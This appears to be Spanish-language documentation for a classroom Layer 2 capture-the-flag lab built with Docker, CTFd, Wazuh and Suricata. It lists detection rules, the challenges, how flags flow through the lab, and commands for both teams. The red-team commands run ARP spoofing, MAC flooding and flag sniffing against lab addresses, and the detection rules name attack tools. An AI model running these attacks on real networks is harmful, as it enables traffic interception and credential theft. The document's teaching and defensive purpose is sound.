  <description>ALERTA: IP duplicada detectada en la red - posible ARP Spoofing</description>
</rule>
```

**Resumen de todas las reglas Wazuh:**

| Rule ID | Nivel | Disparador | Qué detecta |
|---|---|---|---|
| 100001 | 10 | `syscheck` + `/proc/net/arp` | Cambio en tabla ARP del sistema |
| 100002 | 13 | 100001 × 5 en 30s | ARP Spoofing en progreso (correlación) |
| 100003 | 12 | `ossec` + nombre de herramienta | Ejecución de arpspoof/scapy/ettercap |
| 100010 | 12 | `syscheck` + `/flags/` | Acceso o modificación a archivo de flag |
| 100011 | 14 | `syscheck` + `flag` + `deleted` | Flag exfiltrada o eliminada |
| 100020 | 10 | `ossec` + `arp_entries_anomaly` | Tabla ARP con entradas anómalas |
| 100021 | 12 | 100020 × 10 en 20s | MAC Flooding confirmado (correlación) |
| 100030 | 14 | `syscheck` + `gateway_mac_changed` | MITM confirmado — MAC del gateway cambió |
| 100031 | 13 | `ossec` + `duplicate_ip_detected` | IP duplicada (dos MACs, misma IP) |

---

## 5. La Gestión del CTF con CTFd

### Arquitectura del contenedor CTFd

```yaml
ctfd:
  image: ctfd/ctfd:latest
  environment:
    - DATABASE_URL=mysql+pymysql://ctfd:ctfd_password@ctfd-db/ctfd
    - REDIS_URL=redis://ctfd-cache:6379
  ports:
    - "8000:8000"   # Accesible desde el host en http://localhost:8000
  depends_on:
    ctfd-db:
      condition: service_healthy    # Espera hasta que MariaDB esté lista
    ctfd-cache:
      condition: service_healthy    # Espera hasta que Redis esté listo
```

CTFd usa:
- **MariaDB** para persistencia durable: challenges, flags, equipos, puntuaciones, envíos
- **Redis** como caché de sesiones y para el scoreboard en tiempo real
- `condition: service_healthy` garantiza que la app solo arranque cuando sus dependencias ya aceptan conexiones (ambas tienen `healthcheck` configurado en el compose)

### Los 6 retos del CTF

Los challenges se crean mediante la **API REST de CTFd** (`POST /api/v1/challenges`) o por la interfaz de administración web.

| ID | Nombre | Categoría | Puntos | Origen de la flag |
|---|---|---|---|---|
| 1 | Hidden in Plain Sight | ARP Spoofing | 100 | Comentario HTML de victim1 |
| 2 | Leaked Credentials | ARP Spoofing | 150 | `/backup/db_credentials.txt` de victim2 |
| 3 | Intercept the Report | Traffic Sniffing | 200 | Reporte periódico de victim3 (`auth_token=`) |
| 4 | Flood the Switch | MAC Flooding | 200 | Evidencia de ejecución del ataque |
| 5 | Detect ARP Spoofing | Blue Team | 150 | Flag entregada al detectar el ataque |
| 6 | Detect MAC Flooding | Blue Team | 150 | Flag entregada al detectar el flooding |

### Flujo de validación end-to-end

```
[Red Team]
  arp_spoof.py activo (MITM)
         ↓
  capture_flags.py detecta FLAG{...} en el tráfico HTTP interceptado
         ↓
  submit_flag.py  →  POST /api/v1/challenges/attempt
                     { "challenge_id": 1, "submission": "FLAG{...}" }
         ↓
[CTFd - MariaDB]
  Compara submission contra el flag almacenado en la tabla challenges
         ↓
  Responde: "correct" | "incorrect" | "already_solved"
         ↓
[Scoreboard - Redis]
  Puntuación actualizada en tiempo real
```

### El ciclo completo de una flag: de la configuración a la captura

```
.env (FILE1=FLAG{secreto})
  ↓  docker compose up
docker-compose.yml  →  environment: FLAG=${FLAG1}
  ↓  runtime
Contenedor victim1  →  FLAG = os.environ.get("FLAG")
  ↓  HTTP response
Página HTML         →  <!-- Flag de auditoria: FLAG{secreto} -->
  ↓  ARP Spoofing activo
Red Team            →  pkt[Raw].load → regex → "FLAG{secreto}"
  ↓  API REST
CTFd                →  submission == stored_flag → "correct"
```

La cadena garantiza que las flags nunca estén en el código fuente del repositorio (están en `.env`, que está en el `.gitignore`), pero sí viajen por la red en texto plano — exactamente la debilidad de seguridad que el CTF pretende demostrar.

---

## Comandos de Referencia Rápida

```bash
# ============================================================
# Gestión del entorno
# ============================================================
cd ~/Desktop/ProyectoFinalRedes/ctf-layer2-security

sudo sysctl -w vm.max_map_count=262144   # Prerequisito (Wazuh Indexer)
sudo docker compose up -d                # Levantar todo
sudo docker compose down -v             # Destruir todo (incluyendo volúmenes)
sudo docker compose up -d --build       # Reconstruir imágenes y levantar

# Ver estado de todos los contenedores
sudo docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"

# Logs de un servicio específico
sudo docker logs <container> 2>&1 | tail -30

# Verificar que todo está correcto antes de la demo
sudo bash scripts/verify_environment.sh

# Demo automatizada completa (ataque + defensa + recolección de evidencia)
sudo bash scripts/run_ctf_demo.sh

# ============================================================
# Red Team (desde dentro del contenedor)
# ============================================================
sudo docker exec -it redteam bash

# ARP Spoofing contra victim1
python3 /tools/arp_spoof.py -t 172.20.0.10 -g 172.20.0.2 --interval 1

# MAC Flooding (2000 paquetes)
python3 /tools/mac_flood.py -c 2000 --delay 0.001

# Captura de flags (mientras arp_spoof.py corre en otra terminal)
python3 /tools/capture_flags.py --timeout 60 -o /captures/flags.txt

# Enviar flag a CTFd
python3 /tools/submit_flag.py -f "FLAG{...}" -c 1 --token <api_token>

# ============================================================
# Blue Team (desde dentro del contenedor)
# ============================================================
sudo docker exec -it blueteam bash

# Monitor ARP activo
python3 /tools/arp_monitor.py \
    --known 172.20.0.2 172.20.0.10 172.20.0.11 172.20.0.12 \
    --probe-interval 5 -o /logs/arp_alerts.log

# Detector de MAC Flooding
python3 /tools/mac_anomaly_detector.py -o /logs/mac_flood.log

# Restaurar tablas ARP tras el ataque
python3 /tools/arp_restore.py --count 5

# Captura de tráfico con tshark
tshark -i eth0 -w /logs/captura.pcap

# ============================================================
# Acceso a plataformas web
# ============================================================
# CTFd (scoreboard):      http://localhost:8000
# Wazuh Dashboard:        https://localhost:5601
#   Credenciales Wazuh:   admin / SecretPassword

# ============================================================
# Suricata — inspección de alertas
# ============================================================
sudo docker exec suricata tail -f /var/log/suricata/fast.log
sudo docker exec suricata tail -f /var/log/suricata/eve.json | python3 -m json.tool
```
